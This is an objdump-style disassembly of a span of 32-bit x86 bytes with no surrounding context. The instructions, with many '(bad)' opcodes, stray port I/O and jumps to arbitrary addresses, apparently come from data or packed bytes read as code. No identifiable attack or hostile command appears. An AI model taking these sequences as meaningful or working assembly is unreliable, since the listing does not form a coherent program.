  4182bb:	xchg   edx,eax
  4182bc:	out    0xf5,eax
  4182be:	push   ss
  4182bf:	test   dl,dh
  4182c1:	mov    ch,0xed
  4182c3:	dec    eax
  4182c4:	cld    
  4182c5:	inc    eax
  4182c6:	cmp    edi,DWORD PTR [ebx]
  4182c8:	ss pop edx
  4182ca:	dec    ecx
  4182cb:	sar    DWORD PTR [ecx-0x26de96ee],cl
  4182d1:	jle    0x418332
  4182d3:	and    eax,0xe5076aac
  4182d8:	mov    ds:0x73bc8acd,al
  4182dd:	in     eax,dx
  4182de:	cwde   
  4182df:	sbb    al,0xf6
  4182e1:	retf   0x7ca7
  4182e4:	mov    ah,0xec
  4182e6:	cmc    
  4182e7:	add    eax,0xbdf1eaae
  4182ec:	xlat   BYTE PTR ds:[ebx]
  4182ed:	sub    eax,0x137194f8
  4182f2:	or     DWORD PTR [edi+eiz*2+0x3b],edi
  4182f6:	sbb    BYTE PTR [edx+eiz*2+0x7e479b94],bh
  4182fd:	jle    0x4182af
  4182ff:	das    
  418300:	and    al,0x19
  418302:	(bad)  
  418303:	std    
  418304:	(bad)  
  418305:	fwait
  418306:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418307:	fistp  DWORD PTR [edx-0x6d]
  41830a:	fmul   DWORD PTR [edi]
  41830c:	inc    ecx
  41830d:	cwde   
  41830e:	(bad)  
  41830f:	out    0x20,al
  418311:	lea    esi,[ecx]
  418313:	out    0x19,al
  418315:	and    al,0x13
  418317:	lock or eax,0x65f01a97
  41831d:	ja     0x4182a4
  41831f:	cmp    esp,DWORD PTR [esi+0x5c]
  418322:	mov    dl,0x56
  418325:	pop    ecx
  418326:	mov    dl,bh
  418328:	(bad)
  41832c:	xchg   esi,eax
  41832d:	sbb    al,0x5b
  41832f:	push   esi
  418330:	xlat   BYTE PTR ds:[ebx]
  418331:	aad    0xe0
  418333:	popf   
  418334:	mov    bh,ch
  418336:	inc    esi
  418337:	cmp    al,0xec
  418339:	xchg   ebp,eax
  41833a:	sub    eax,0x5a741bc4
  41833f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418340:	jmp    0x1a0b471
  418345:	xchg   ebx,eax
  418346:	popf   
  418347:	pop    ebp
  418348:	sub    esp,esp
  41834a:	jbe    0x4182db
  41834c:	mov    eax,ds:0x9b48a8ee
  418351:	cld    
  418352:	fstp   TBYTE PTR [eax]
  418354:	xor    al,0x1
  418356:	in     al,dx
  418357:	fnstsw WORD PTR [edi+0xb]
  41835a:	daa    
  41835b:	fwait
  41835c:	stc    
  41835d:	aad    0x1e
  41835f:	add    al,BYTE PTR [esi]
  418361:	(bad)  [esp+eax*2]
  418364:	mov    dl,0x9f
  418366:	or     ebx,DWORD PTR [edi+ebx*1-0x52c47d54]
  41836d:	loopne 0x418343
  41836f:	sbb    dh,BYTE PTR [edx+0x72a224f1]
  418375:	and    DWORD PTR [edi-0x4c],ecx
  418378:	push   ebp
  418379:	arpl   sp,dx
  41837b:	fmul   QWORD PTR [ecx]
  41837d:	aam    0xfd
  41837f:	push   cs
  418380:	fst    DWORD PTR [ebp+0x9]
  418383:	jmp    0x418394
  418385:	sub    dl,dl
  418387:	ror    ch,cl
  418389:	ds (bad) 
  41838c:	arpl   WORD PTR [esp+ecx*1],di
  41838f:	test   eax,0x1be8667
  418394:	clc    
  418395:	xchg   edi,eax
  418396:	popf   
  418397:	sbb    DWORD PTR [ebp-0xa],edi
  41839a:	out    0x69,al
  41839c:	aas    
  41839d:	aaa    
  41839e:	loop   0x4183fd
  4183a0:	into   
  4183a1:	dec    ecx
  4183a2:	or     BYTE PTR [ebp+0x2a37838e],dh
  4183a8:	mov    al,0xf3
  4183aa:	loopne 0x418396
  4183ac:	in     eax,dx
  4183ad:	sub    al,0xa0
  4183af:	fsubr  QWORD PTR [eax-0x42]
  4183b2:	std    
  4183b3:	jns    0x41834e
  4183b5:	dec    ebp
  4183b6:	adc    dh,BYTE PTR [ebx+0x7c]
  4183b9:	jg     0x41837c
  4183bb:	clc    
  4183bc:	loopne 0x418344
  4183be:	stc    
  4183bf:	in     al,dx
  4183c0:	cmp    BYTE PTR [edi-0x3d],0x2e
  4183c4:	cli    
  4183c5:	ds mov ch,0x90
  4183c8:	bound  esp,QWORD PTR [esi]
  4183ca:	inc    edi
  4183cb:	test   eax,0xc2c2ee86
  4183d0:	jno    0x418423
  4183d2:	push   cs
  4183d3:	(bad)  
  4183d4:	adc    al,0xc0
  4183d6:	xor    bh,BYTE PTR [esi+0x6688f4db]
  4183dc:	dec    ebx
  4183dd:	fisttp WORD PTR [ebx+ebp*2+0x692596da]
  4183e4:	dec    ebp
  4183e5:	sahf   
  4183e6:	fdivr  QWORD PTR [edi]
  4183e8:	inc    si
  4183ea:	popa   
  4183eb:	outs   dx,BYTE PTR ds:[esi]
  4183ec:	pop    edi
  4183ed:	cmp    dh,BYTE PTR [ecx+0xd]
  4183f0:	fdiv   DWORD PTR [eax+0x251dabb8]
  4183f6:	dec    ebp
  4183f7:	jb     0x418439
  4183f9:	jbe    0x4183c3
  4183fb:	ds jb  0x418445
  4183fe:	and    cl,BYTE PTR [eax+0x60]
  418401:	inc    eax
  418402:	(bad)  
  418403:	xchg   ebp,eax
  418404:	(bad)  
  418405:	or     ebp,edi
  418407:	add    bh,BYTE PTR [esi+0x6]
  41840a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41840b:	pop    esi
  41840c:	adc    eax,0x1f96ae3f
  418411:	push   eax
  418412:	sbb    DWORD PTR [esi],ebx
  418414:	int3   
  418415:	lock mul BYTE PTR [esi+0x11]
  418419:	out    0xf6,al
  41841b:	inc    esp
  41841c:	and    al,0xfa
  41841f:	aam    0xad
  418421:	sub    al,0xc
  418423:	adc    edi,DWORD PTR [esi]
  418425:	(bad)  
  418426:	cmp    DWORD PTR [eax+ebp*4-0x28],ebx
  41842a:	loopne 0x418488
  41842c:	inc    esp
  41842d:	int3   
  41842e:	mov    ecx,0xb04ee2ab
  418433:	sub    eax,0x1020309f
  418438:	mov    edi,DWORD PTR [esi]
  41843a:	push   edi
  41843b:	or     dl,BYTE PTR [ebp+0x47]
  41843e:	fisttp QWORD PTR [ebx+0x55f09e8c]
  418444:	addr16 cmp ebp,esp
  418447:	cmp    dh,cl
  418449:	dec    esp
  41844a:	scas   eax,DWORD PTR es:[edi]
  41844b:	dec    ebx
  41844c:	retf   
  41844d:	arpl   WORD PTR [ebx-0x37],bx
  418450:	das    
  418451:	sbb    ebp,DWORD PTR ds:0x2a1835b4
  418457:	jns    0x4183f6
  418459:	into   
  41845a:	mov    ebp,0xcca6da7a
  41845f:	popa   
  418460:	js     0x418432
  418462:	(bad)  
  418463:	out    0x7c,eax
  418465:	cmp    ebp,DWORD PTR [eax-0x72]
  418468:	mov    esp,0x7e67727c
  41846d:	mov    dh,0x66
  41846f:	int3   
  418470:	stos   DWORD PTR es:[edi],eax
  418471:	add    edi,ebp
  418473:	push   ecx
  418474:	and    bl,bh
  418476:	das    
  418477:	stos   DWORD PTR es:[edi],eax
  418478:	inc    ecx
  418479:	push   ebp
  41847a:	inc    ebp
  41847b:	mov    ds:0x8de9c488,al
  418480:	(bad)  
  418481:	pop    ebp
  418482:	add    al,0x3d
  418484:	cmp    DWORD PTR [esi+0x4bcef10f],0x6a
  41848b:	vfmaddps xmm1,xmm5,xmm7,xmm4
  418491:	xchg   edx,eax
  418492:	jbe    0x4184b7
  418494:	xor    al,0xd3
  418496:	les    ebx,FWORD PTR [edi]
  418498:	hlt    
  418499:	or     BYTE PTR [edx-0x64],cl
  41849c:	cld    
  41849d:	fstp   QWORD PTR [ebp+0x525df049]
  4184a3:	inc    edi
  4184a4:	or     DWORD PTR [edi],ebp
  4184a6:	mov    ebp,0x9f822150
  4184ab:	out    dx,al
  4184ac:	lods   al,BYTE PTR ds:[esi]
  4184ae:	stos   DWORD PTR es:[edi],eax
  4184af:	cmc    
  4184b0:	pop    ebx
  4184b1:	and    eax,0x7bd19884
  4184b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184b7:	xchg   ebp,eax
  4184b8:	push   edx
  4184b9:	fist   WORD PTR [ebx-0x7c6dd3ab]
  4184bf:	call   0x77af:0xf36ad9c4
  4184c6:	test   DWORD PTR [ebx],ebx
  4184c8:	and    DWORD PTR [edi+esi*2],esp
  4184cb:	xlat   BYTE PTR ds:[ebx]
  4184cc:	shr    BYTE PTR [esi+0x77],1
  4184cf:	mov    edi,0x3bf78de5
  4184d4:	imul   BYTE PTR [edx]
  4184d6:	daa    
  4184d7:	push   es
  4184d8:	aas    
  4184d9:	add    esp,ebx
  4184db:	fsubr  st(4),st
  4184dd:	js     0x4184f4
  4184df:	lods   al,BYTE PTR ds:[esi]
  4184e0:	fst    QWORD PTR [ebp-0x64823cb8]
  4184e6:	ret    
  4184e7:	add    eax,DWORD PTR [eax-0x333e3dee]
  4184ed:	push   ds
  4184ee:	sbb    DWORD PTR [edi+0x162aeed1],ebx
  4184f4:	push   edx
  4184f5:	mov    ebx,DWORD PTR [ebx+0x9f72faf]
  4184fb:	fdiv   st,st(3)
  4184fd:	addr16 icebp 
  4184ff:	xchg   edx,eax
  418500:	mov    al,0xf7
  418502:	adc    al,0x23
  418504:	test   BYTE PTR [edi+0x36],0x72
  418508:	sbb    BYTE PTR [ecx+0x3],ch
  41850b:	mov    WORD PTR [esi],?
  41850d:	stos   BYTE PTR es:[edi],al
  41850e:	xor    ebp,eax
  418510:	pop    es
  418511:	add    DWORD PTR [ebp-0x1dc15bd0],edi
  418517:	push   ds
  418518:	sbb    al,0x2c
  41851a:	inc    esp
  41851b:	fdivr  QWORD PTR [ebp+0x63]
  41851e:	inc    ebx
  41851f:	lahf   
  418520:	bound  esi,QWORD PTR [eax-0x271ad85f]
  418526:	int3   
  418527:	push   ss
  418528:	jo     0x41856f
  41852a:	pop    ss
  41852b:	fisttp QWORD PTR [ebx]
  41852d:	cwde   
  41852e:	push   ecx
  41852f:	adc    al,0xd5
  418531:	dec    esp
  418532:	mov    ds:0x4d8ca935,al
  418537:	xchg   BYTE PTR [ecx],dl
  418539:	sti    
  41853a:	add    BYTE PTR [ebx-0x2a9bb380],0x64
  418541:	xchg   DWORD PTR [edx-0x2b],ebp
  418544:	ficom  DWORD PTR [eax]
  418546:	and    eax,0x9fe65be0
  41854b:	dec    eax
  41854c:	iret   
  41854d:	mov    edx,0x4745811f
  418552:	jmp    0xa78a:0x49c322bc
  418559:	inc    eax
  41855a:	mov    bl,0x3a
  41855c:	out    dx,eax
  41855d:	js     0x418566
  41855f:	stc    
  418560:	cmp    DWORD PTR [ecx+0x63],esp
  418563:	jnp    0x418591
  418565:	pop    ss
  418566:	xor    BYTE PTR [edx],dh
  418568:	and    eax,0xe2878000
  41856d:	xor    BYTE PTR [eax],ch
  41856f:	mov    WORD PTR [ebx+eax*8],?
  418572:	popa   
  418573:	jns    0x4185ea
  418575:	xchg   edx,eax
  418576:	xlat   BYTE PTR ds:[ebx]
  418577:	or     DWORD PTR [ebp+0x1e],edx
  41857a:	xchg   BYTE PTR [ecx-0x7b945fe6],dl
  418580:	frstor [eax]
  418582:	jle    0x418514
  418584:	adc    cl,BYTE PTR [edx+edx*2]
  418587:	mov    DWORD PTR [edx+0x3b],ebx
  41858a:	out    0xbf,al
  41858c:	or     eax,0x58843935
  418591:	sub    al,0xd0
  418593:	stc    
  418594:	cmp    BYTE PTR [esp+eiz*8+0x3],0x2f
  418599:	js     0x4185e2
  41859b:	bound  ecx,QWORD PTR [edx+0x15]
  41859e:	jnp    0x418573
  4185a0:	push   0x89c3612f
  4185a5:	call   DWORD PTR [edi]
  4185a7:	cmc    
  4185a8:	outs   dx,DWORD PTR ds:[esi]
  4185a9:	inc    edi
  4185aa:	int    0x82
  4185ac:	iret   
  4185ad:	aas    
  4185ae:	add    eax,DWORD PTR [ebx-0x3a9de8b3]
  4185b4:	lods   eax,DWORD PTR ds:[esi]
  4185b5:	out    dx,al
  4185b6:	(bad)  
  4185b7:	jl     0x4185f7
  4185b9:	xor    esi,DWORD PTR [ebp+0x3d7572f4]
  4185bf:	(bad)  
  4185c0:	out    0x17,al
  4185c2:	(bad)  [ecx-0x67b1b3c0]
  4185c8:	sbb    BYTE PTR [edx],ch
  4185ca:	outs   dx,DWORD PTR ds:[esi]
  4185cb:	push   ecx
  4185cc:	leave  
  4185cd:	jl     0x41854f
  4185cf:	xor    al,0x49
  4185d1:	(bad)  
  4185d2:	retf   
  4185d3:	dec    eax
  4185d4:	out    dx,eax
  4185d5:	xchg   edx,eax
  4185d6:	adc    al,0xcf
  4185d8:	add    ecx,esi
  4185da:	jnp    0x4185f6
  4185dc:	retf   
  4185dd:	push   ebx
  4185de:	cmp    ecx,ebp
  4185e0:	ins    BYTE PTR es:[edi],dx
  4185e1:	mov    ds:0x4bb97e76,eax
  4185e6:	xchg   edi,eax
  4185e7:	xchg   ecx,eax
  4185e8:	push   0x4c73f16c
  4185ed:	and    al,0xf7
  4185ef:	pop    eax
  4185f0:	cmp    BYTE PTR [esi-0x5b3f4779],dh
  4185f6:	outs   dx,BYTE PTR ds:[esi]
  4185f7:	pop    ss
  4185f8:	ins    DWORD PTR es:[edi],dx
  4185f9:	inc    edi
  4185fa:	aaa    
  4185fb:	adc    eax,0xb4dd83a2
  418600:	cli    
  418601:	loop   0x4185fd
  418603:	inc    ebp
  418604:	sub    DWORD PTR [ebx],eax
  418606:	clc    
  418607:	sbb    ebp,DWORD PTR [ecx-0x9]
  41860a:	push   ss
  41860b:	lahf   
  41860c:	aam    0x37
  41860e:	pop    edi
  41860f:	and    al,ch
  418611:	in     eax,dx
  418612:	loop   0x4185fc
  418614:	shr    BYTE PTR [esi+0x1146ecb0],cl
  41861a:	xchg   BYTE PTR [edi+0x53],ah
  41861d:	(bad)  
  41861e:	mov    bh,0x0
  418620:	faddp  st(2),st
  418622:	mov    esi,0xb06625e8
  418627:	ins    BYTE PTR es:[edi],dx
  418628:	aaa    
  418629:	call   0xb68a:0xedf4886d
  418630:	push   eax
  418631:	fist   DWORD PTR [edi+0x549031c0]
  418637:	dec    esp
  418638:	dec    edi
  418639:	vmread esp,ebx
  41863c:	mov    al,ds:0x320189c4
  418641:	loopne 0x4186a4
  418643:	outs   dx,BYTE PTR ds:[esi]
  418644:	mov    ds:0x8a820c69,al
  418649:	out    dx,al
  41864a:	or     ebx,0xd1e5d899
  418650:	sub    al,0x6b
  418652:	dec    ecx
  418653:	fisub  DWORD PTR [ebx+eiz*1-0x1200b212]
  41865a:	adc    ch,BYTE PTR [ecx+0x22]
  41865d:	cdq    
  41865e:	ret    0x35fa
  418661:	sbb    dh,BYTE PTR [bx+0x28]
  418665:	jno    0x41866f
  418667:	sub    DWORD PTR ds:0xfb8b7325,ebx
  41866d:	cmp    eax,0x347ed0ac
  418672:	xor    eax,0x4a442336
  418677:	or     DWORD PTR [edx],esp
  418679:	mov    WORD PTR [eax-0x4b96f215],fs
  41867f:	mov    ds,ecx
  418681:	or     dh,BYTE PTR [eax-0x3f]
  418684:	lods   eax,DWORD PTR ds:[esi]
  418685:	in     eax,dx
  418686:	imul   esi,DWORD PTR [eax+0x57],0xfe021715
  41868d:	daa    
  41868e:	jp     0x4186e3
  418690:	sbb    eax,0x2b98c624
  418695:	dec    edx
  418696:	scas   al,BYTE PTR es:[edi]
  418697:	cmp    DWORD PTR [edi],eax
  418699:	jns    0x41870a
  41869b:	sar    BYTE PTR ds:0xabd6d702,0xcd
  4186a2:	mov    al,0x80
  4186a4:	mov    eax,ds:0x5c5c9abb
  4186a9:	hlt    
  4186aa:	pop    ecx
  4186ab:	sub    BYTE PTR [esi-0x27e991df],al
  4186b1:	sub    eax,0x6fc4ab3d
  4186b6:	aam    0x6d
  4186b8:	inc    esi
  4186b9:	pop    esp
  4186ba:	lahf   
  4186bb:	inc    ebx
  4186bc:	and    edi,DWORD PTR [ecx+0x51764b1b]
  4186c2:	int    0xe3
  4186c4:	adc    DWORD PTR [ecx-0x41],esp
  4186c7:	mov    es:0xc2f07b59,al
  4186cd:	dec    edi
  4186ce:	and    BYTE PTR [esi-0x7b],0x36
  4186d2:	push   es
  4186d3:	lea    ebx,[esi]
  4186d5:	add    DWORD PTR [ecx-0x18a34885],0x52f48961
  4186df:	and    esp,DWORD PTR [esi]
  4186e1:	cmp    cl,BYTE PTR [edi]
  4186e3:	arpl   si,cx
  4186e5:	int    0xba
  4186e7:	pop    eax
  4186e8:	mov    esp,0x4c126c44
  4186ed:	and    BYTE PTR [ebp-0x5a41b81b],0x4
  4186f4:	in     eax,dx
  4186f5:	pop    es
  4186f6:	fnstcw WORD PTR [esi-0x4b]
  4186f9:	inc    edi
  4186fa:	mov    dl,0x4b
  4186fc:	into   
  4186fd:	popa   
  4186fe:	ins    DWORD PTR es:[edi],dx
  4186ff:	adc    eax,0xa88ba23c
  418704:	lds    ebp,FWORD PTR [ecx+ebp*2-0x7f5f93cf]
  41870b:	jecxz  0x4186fc
  41870d:	mov    ebp,0x6c6b9cf3
  418712:	outs   dx,BYTE PTR ds:[esi]
  418713:	sub    cl,0x1f
  418716:	cwde   
  418717:	ja     0x41877e
  418719:	sbb    DWORD PTR [ecx-0x639ae09a],ebx
  41871f:	sbb    ecx,ebx
  418721:	cwde   
  418722:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418723:	pop    ebp
  418724:	sub    eax,0xab0942f7
  418729:	lds    ebx,FWORD PTR [esi-0x653ce04a]
  41872f:	out    dx,eax
  418730:	xchg   esp,eax
  418731:	jbe    0x418701
  418733:	xor    esi,DWORD PTR [ebx-0x7391ddaa]
  418739:	mov    ah,0x22
  41873b:	fsubr  st,st(0)
  41873d:	cmp    al,0x83
  41873f:	pusha  
  418740:	stos   DWORD PTR es:[edi],eax
  418741:	into   
  418742:	mov    esp,0xc687e553
  418747:	push   0xb3b782bb
  41874c:	and    ecx,DWORD PTR [ecx-0x6e]
  41874f:	mov    al,ds:0xfc4c4537
  418754:	pop    es
  418755:	lock dec ecx
  418757:	push   cs
  418758:	dec    ebx
  418759:	leave  
  41875a:	cmp    esp,DWORD PTR [eax-0x1f]
  41875d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41875e:	mov    bh,bh
  418760:	lods   al,BYTE PTR ds:[esi]
  418761:	sub    al,0xe
  418763:	pop    ebx
  418764:	lock ret 0xfa7d
  418768:	jmp    0x4187b6
  41876a:	dec    esp
  41876b:	mov    ds:0xde8c4f2,eax
  418770:	sub    al,dl
  418772:	test   al,0x8e
  418774:	dec    esp
  418775:	(bad)  
  418776:	mov    esi,0x7d08d5ed
  41877b:	sbb    al,0x88
  41877d:	adc    bh,BYTE PTR ds:0x6e51bafe
  418783:	mov    esp,0x505aa446
  418788:	mov    ds:0x2089cb87,eax
  41878d:	enter  0xe2ff,0xa5
  418791:	aad    0xc8
  418793:	dec    eax
  418794:	dec    eax
  418795:	dec    esp
  418796:	retf   0x19d7
  418799:	or     cl,BYTE PTR [edx+ecx*8-0x4866088e]
  4187a0:	mov    BYTE PTR [eax+0x1a5a9505],bh
  4187a6:	cmc    
  4187a7:	cli    
  4187a8:	mov    edx,0x6757fb32
  4187ad:	retf   0x1929
  4187b0:	vhsubps ymm0,ymm3,YMMWORD PTR [esi-0x63]
  4187b5:	push   0xe5cb6746
  4187ba:	xor    DWORD PTR [ebp-0x1e],eax
  4187bd:	xor    edx,ebx
  4187bf:	sub    BYTE PTR [esi+0x65],dl
  4187c2:	outs   dx,DWORD PTR ds:[esi]
  4187c3:	xor    DWORD PTR [esi+edi*1],esp
  4187c6:	ds dec edi
  4187c8:	dec    edi
  4187c9:	in     al,0x1b
  4187cb:	in     al,0x1a
  4187cd:	push   eax
  4187ce:	adc    eax,0x606ff3f5
  4187d3:	and    al,0xc
  4187d5:	mov    ?,WORD PTR [edi]
  4187d7:	scas   eax,DWORD PTR es:[edi]
  4187d8:	add    eax,0xf1c2662d
  4187dd:	push   edi
  4187de:	daa    
  4187df:	or     esp,DWORD PTR [ebx+0x26203369]
  4187e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187e6:	xchg   ebx,eax
  4187e7:	loopne 0x4187d4
  4187e9:	dec    ebp
  4187ea:	into   
  4187eb:	push   esi
  4187ec:	retf   
  4187ed:	xor    ah,BYTE PTR [esi+0x2aa19e39]
  4187f3:	mov    WORD PTR [ebx],?
  4187f5:	mov    bl,0x41
  4187f7:	shl    esp,0x41
  4187fa:	push   ecx
  4187fb:	jp     0x418854
  4187fd:	ins    DWORD PTR es:[edi],dx
  4187fe:	cmc    
  4187ff:	out    0xe0,eax
  418801:	hlt    
  418802:	(bad)  
  418804:	stc    
  418805:	jbe    0x4187d1
  418807:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418808:	push   ss
  418809:	mov    ecx,0xac3384fb
  41880e:	mov    eax,ds:0xe391af40
  418813:	add    ebp,esp
  418815:	je     0x418817
  418817:	inc    ecx
  418818:	rcl    BYTE PTR [eax],1
  41881a:	inc    ecx
  41881b:	pop    ebx
  41881c:	or     eax,0xf5c9ad1b
  418821:	adc    al,0xe9
  418823:	pop    ds
  418824:	xor    al,0x57
  418826:	ret    0xcadb
  418829:	stc    
  41882a:	cmp    al,0xab
  41882c:	mov    ebx,0x5d6ccc48
  418831:	lods   eax,DWORD PTR ds:[esi]
  418832:	mov    ?,WORD PTR [ecx+0x595c13d0]
  418838:	jmp    0xcd04d621
  41883d:	js     0x418810
  41883f:	mov    WORD PTR [edx],?
  418841:	mov    bl,0x4d
  418843:	or     al,0xa5
  418845:	popf   
  418846:	mov    eax,0x3a7328f8
  41884b:	inc    ebx
  41884c:	xchg   esi,eax
  41884d:	arpl   WORD PTR [edi+ebp*2+0x36d9940e],ax
  418854:	push   ecx
  418855:	add    esi,0x1fb00427
  41885b:	xor    DWORD PTR [edi+0x70],esp
  41885e:	scas   eax,DWORD PTR es:[edi]
  41885f:	mov    edi,0x177cf86
  418865:	or     DWORD PTR [edx+0x5785214a],eax
  41886b:	sbb    cl,BYTE PTR [ecx+eax*4-0x62a7ac55]
  418872:	sub    al,0x10
  418874:	pop    es
  418875:	xor    ebp,DWORD PTR [eax-0x44df8266]
  41887b:	data16 jae 0x418827
  41887e:	sbb    eax,0x8e772b6
  418883:	pusha  
  418884:	mov    es,WORD PTR [edi+eax*4-0x2bfb5525]
  41888b:	and    bl,BYTE PTR [esi+0x1f]
  41888e:	jb     0x4188f0
  418890:	dec    eax
  418891:	mov    eax,ds:0xeffabaa6
  418896:	das    
  418897:	and    al,BYTE PTR [ecx+ecx*8-0x7c]
  41889b:	push   es
  41889c:	dec    ecx
  41889d:	mov    WORD PTR [ecx+0x2e],ds
  4188a0:	pop    ebp
  4188a1:	push   ds
  4188a2:	dec    ebp
  4188a3:	sbb    BYTE PTR fs:[edx+edi*2-0x64],bl
  4188a8:	and    bl,BYTE PTR [ebp-0xd]
  4188ab:	dec    edi
  4188ac:	in     eax,dx
  4188ad:	dec    ecx
  4188ae:	into   
  4188af:	push   0xd2e52625
  4188b4:	scas   eax,DWORD PTR es:[edi]
  4188b5:	xor    al,bl
  4188b7:	call   0x1379d7ea
  4188bc:	dec    ebp
  4188bd:	pop    ss
  4188be:	adc    eax,0x396a3a08
  4188c3:	iret   
  4188c4:	inc    ebx
  4188c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188c6:	mov    eax,0x4362375b
  4188cb:	mov    bl,0x1d
  4188cd:	clc    
  4188ce:	push   ss
  4188cf:	jp     0x418880
  4188d1:	in     al,dx
  4188d2:	mov    ds:0xe941724a,al
  4188d7:	aas    
  4188d8:	int    0xdc
  4188da:	adc    BYTE PTR [eax+0x452be163],bh
  4188e0:	out    dx,eax
  4188e1:	mov    esi,0x93db79c1
  4188e6:	pop    esp
  4188e7:	dec    edi
  4188e8:	(bad)  
  4188e9:	mov    esp,0x3275d01a
  4188ee:	in     al,dx
  4188ef:	and    al,ch
  4188f1:	pop    es
  4188f2:	fdivr  st(7),st
  4188f4:	ins    DWORD PTR es:[edi],dx
  4188f5:	repz add ebx,DWORD PTR [esi-0x2c]
  4188f9:	inc    ebp
  4188fa:	lods   eax,DWORD PTR ds:[esi]
  4188fb:	test   DWORD PTR [esi+eiz*2-0xe3ccb37],esp
  418902:	inc    esi
  418903:	lds    ecx,FWORD PTR [esi]
  418905:	jg     0x41895a
  418907:	mov    dl,0xce
  418909:	fstp   TBYTE PTR [ecx+esi*2-0x4c38ae37]
  418910:	xor    al,dl
  418912:	xlat   BYTE PTR ds:[ebx]
  418913:	sub    DWORD PTR [ecx+edx*4+0x7d],0xffffff9f
  418918:	and    dl,BYTE PTR [ebx]
  41891a:	jnp    0x4188fd
  41891c:	ins    BYTE PTR es:[edi],dx
  41891d:	add    BYTE PTR [eax],dl
  41891f:	std    
  418920:	mov    dl,cl
  418922:	or     al,0xb2
  418924:	rcr    BYTE PTR [ecx+0x42],0xb6
  418928:	push   esi
  418929:	gs xor al,bl
  41892c:	into   
  41892d:	or     cl,BYTE PTR [edi]
  41892f:	(bad)  
  418930:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418931:	cld    
  418932:	inc    edi
  418933:	sbb    DWORD PTR [eax+0x6b],edx
  418936:	or     eax,0x5581a969
  41893b:	test   dh,dl
  41893d:	shl    edx,0x9c
  418940:	pushf  
  418941:	mov    fs,WORD PTR [ebx-0x3c]
  418944:	dec    ecx
  418945:	jae    0x4188f5
  418947:	in     eax,0x73
  418949:	adc    al,0xcd
  41894b:	aam    0x17
  41894d:	and    DWORD PTR [ecx],ebp
  41894f:	mov    BYTE PTR ss:[esi-0x55],cl
  418953:	das    
  418954:	pop    edi
  418955:	aas    
  418956:	pop    esp
  418957:	pop    ecx
  418958:	call   0x960e9bb2
  41895d:	stos   DWORD PTR es:[edi],eax
  41895e:	push   es
  41895f:	xchg   esp,eax
  418960:	in     al,dx
  418961:	add    DWORD PTR [ebx+0x5f],esi
  418964:	cmp    al,0x30
  418966:	cli    
  418967:	icebp  
  418968:	push   esi
  418969:	dec    ebp
  41896a:	sub    bh,BYTE PTR [eax-0xb]
  41896d:	mov    edx,0x1c814ec8
  418972:	imul   edx,DWORD PTR [eax+eiz*2],0xa2574dc0
  418979:	inc    esp
  41897a:	push   esp
  41897b:	push   ds
  41897c:	mov    dl,BYTE PTR [ecx]
  41897e:	(bad)  
  41897f:	rcl    eax,0xf8
  418982:	enter  0xc292,0xb8
  418986:	and    ebx,ebp
  418988:	sub    eax,0xe6074313
  41898d:	dec    eax
  41898e:	int3   
  41898f:	(bad)  
  418990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418991:	fisub  WORD PTR [esp+ecx*4+0x20]
  418995:	stos   BYTE PTR es:[edi],al
  418996:	adc    bl,dl
  418998:	xlat   BYTE PTR ds:[ebx]
  418999:	repnz ror DWORD PTR [edi],1
  41899c:	mov    BYTE PTR ds:0x430847ce,dh
  4189a2:	retf   
  4189a3:	sti    
  4189a4:	inc    eax
  4189a5:	fnstenv [ecx]
  4189a7:	lea    ebx,ds:0x2c82cb98
  4189ad:	push   es
  4189ae:	je     0x4189aa
  4189b0:	lock push eax
  4189b2:	cld    
  4189b3:	lea    edx,[ebp+0x63]
  4189b6:	mov    bh,0x32
  4189b8:	mov    ds:0xec9d7661,al
  4189bd:	int    0x20
  4189bf:	ffree  st(5)
  4189c1:	cli    
  4189c2:	cwde   
  4189c3:	inc    ecx
  4189c4:	pop    ss
  4189c5:	std    
  4189c6:	cmp    al,0xdd
  4189c8:	dec    ebx
  4189c9:	iret   
  4189ca:	ss hlt 
  4189cc:	int    0x75
  4189ce:	pop    esp
  4189cf:	push   ecx
  4189d0:	sub    dl,BYTE PTR [edx-0x5e0a561e]
  4189d6:	xchg   ecx,eax
  4189d7:	and    al,0x55
  4189d9:	sbb    esi,ecx
  4189db:	add    DWORD PTR [edi+0x63f8347a],ecx
  4189e1:	xor    BYTE PTR [eax+ebx*4],ch
  4189e4:	jns    0x41898e
  4189e6:	into   
  4189e7:	(bad)  
  4189e8:	stos   DWORD PTR es:[edi],eax
  4189e9:	cmp    eax,0xe14a926d
  4189ee:	in     al,0x23
  4189f0:	xor    BYTE PTR [edx+0x4f3abf2],0xb
  4189f7:	iret   
  4189f8:	jbe    0x418a74
  4189fa:	pop    es
  4189fb:	int3   
  4189fc:	cmp    BYTE PTR [ebx],0x4
  4189ff:	jp     0x4189f3
  418a01:	adc    al,0x63
  418a03:	inc    eax
  418a04:	cli    
  418a05:	jmp    0x4189d8
  418a07:	jl     0x418a0c
  418a09:	jmp    0xeb81f332
  418a0e:	retf   0x8196
  418a11:	sub    bh,BYTE PTR [edi]
  418a13:	mov    ds:0xd92a50b8,al
  418a18:	ins    DWORD PTR es:[edi],dx
  418a19:	ds leave 
  418a1b:	adc    eax,DWORD PTR [ebx-0x7497f08b]
  418a21:	hlt    
  418a22:	rcr    BYTE PTR [ebp+edi*4-0x19],1
  418a26:	pushf  
  418a27:	fpatan 
  418a29:	repnz push eax
  418a2b:	icebp  
  418a2c:	mov    BYTE PTR [ecx+0x5f06e925],ah
  418a32:	pop    ebp
  418a33:	adc    ch,bl
  418a35:	or     DWORD PTR [esi],eax
  418a37:	ds stos DWORD PTR es:[edi],eax
  418a39:	xchg   ecx,eax
  418a3a:	sbb    DWORD PTR [ebx-0x6670f018],eax
  418a40:	sahf   
  418a41:	inc    eax
  418a42:	repnz dec ebp
  418a44:	repz push edx
  418a46:	pop    ss
  418a47:	add    BYTE PTR [edx],dh
  418a49:	out    0xac,al
  418a4b:	pop    edi
  418a4c:	mov    DWORD PTR [ebx-0x24],ebx
